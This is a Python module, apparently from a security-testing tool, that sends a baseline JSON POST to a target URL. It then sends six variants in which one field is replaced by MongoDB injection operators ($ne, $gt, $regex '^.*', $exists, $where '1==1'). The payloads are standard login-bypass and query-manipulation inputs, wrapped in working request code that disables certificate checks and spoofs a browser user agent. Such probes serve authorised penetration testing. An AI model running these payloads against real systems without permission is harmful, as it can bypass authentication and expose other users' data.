"""
Raw execution for nosql_injection_probe: sends a baseline JSON POST, then a
bounded set of NoSQL-operator-injected variants of the same body, and
returns both for differential comparison. No parsing/diffing logic here --
that's parse.py's job. Strictly POST, hard-capped at MAX_PAYLOADS variants.
"""
from __future__ import annotations

import json
import time
from dataclasses import dataclass
from dataclasses import field as dc_field
from typing import Any, Dict, List, Optional

try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    requests = None

USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Tradecraft/1.0"
MAX_PAYLOADS = 6

# (operator_name, operator_value) -- each replaces the target field's
# original string value with a MongoDB query operator object. These are
# read-only query-shaping operators; none of them write or delete data.
NOSQL_OPERATORS: List[tuple] = [
    ("$ne", {"$ne": None}),
    ("$ne_empty", {"$ne": ""}),
    ("$gt", {"$gt": ""}),
    ("$regex_any", {"$regex": "^.*"}),
    ("$exists", {"$exists": True}),
    ("$where_true", {"$where": "1==1"}),
]


@dataclass
class RawNoSqlResponse:
    operator: str
    status_code: int = 0
    content_type: str = ""
    body: str = ""
    body_length: int = 0
    duration_seconds: float = 0.0
    error: Optional[str] = None


@dataclass
class RawNoSqlInjectionResult:
    target: str = ""
    field: str = ""
    baseline_response: Optional[RawNoSqlResponse] = None
    probes: List[RawNoSqlResponse] = dc_field(default_factory=list)
    error: Optional[str] = None


def _post_json(url: str, body: Dict[str, Any], headers: Dict[str, str], timeout: int, operator_label: str) -> RawNoSqlResponse:
    t0 = time.time()
    try:
        resp = requests.post(url, json=body, headers=headers, timeout=timeout, verify=False)
        duration = round(time.time() - t0, 3)
        return RawNoSqlResponse(
            operator=operator_label,
            status_code=resp.status_code,
            content_type=resp.headers.get("content-type", ""),
            body=resp.text or "",
            body_length=len(resp.text or ""),
            duration_seconds=duration,
        )
    except requests.RequestException as exc:
        return RawNoSqlResponse(operator=operator_label, error=str(exc))


def execute(
    target: str,
    body: str,
    field: str,
    headers: Optional[str] = None,
    timeout: int = 10,
) -> RawNoSqlInjectionResult:
    if requests is None:
        return RawNoSqlInjectionResult(target=target, field=field, error="requests library not available")

    cleaned_target = (target or "").strip()
    if not cleaned_target:
        return RawNoSqlInjectionResult(error="empty target URL")
    if not cleaned_target.startswith(("http://", "https://")):
        cleaned_target = f"https://{cleaned_target}"

    if not field:
        return RawNoSqlInjectionResult(target=cleaned_target, error="missing required 'field' parameter")

    try:
        base_body = json.loads(body) if body else {}
    except (ValueError, TypeError):
        return RawNoSqlInjectionResult(target=cleaned_target, field=field, error="'body' is not valid JSON")

    if field not in base_body:
        return RawNoSqlInjectionResult(
            target=cleaned_target, field=field,
            error=f"field '{field}' not found in the given JSON body",
        )

    req_headers = {"User-Agent": USER_AGENT, "Content-Type": "application/json"}
    if headers:
        for line in headers.splitlines():
            line = line.strip()
            if not line or ":" not in line:
                continue
            k, _, v = line.partition(":")
            req_headers[k.strip()] = v.strip()

    result = RawNoSqlInjectionResult(target=cleaned_target, field=field)

    baseline_resp = _post_json(cleaned_target, base_body, req_headers, timeout, "baseline")
    result.baseline_response = baseline_resp

    for operator_name, operator_value in NOSQL_OPERATORS[:MAX_PAYLOADS]:
        variant_body = dict(base_body)
        variant_body[field] = operator_value
        probe_resp = _post_json(cleaned_target, variant_body, req_headers, timeout, operator_name)
        result.probes.append(probe_resp)

    return result
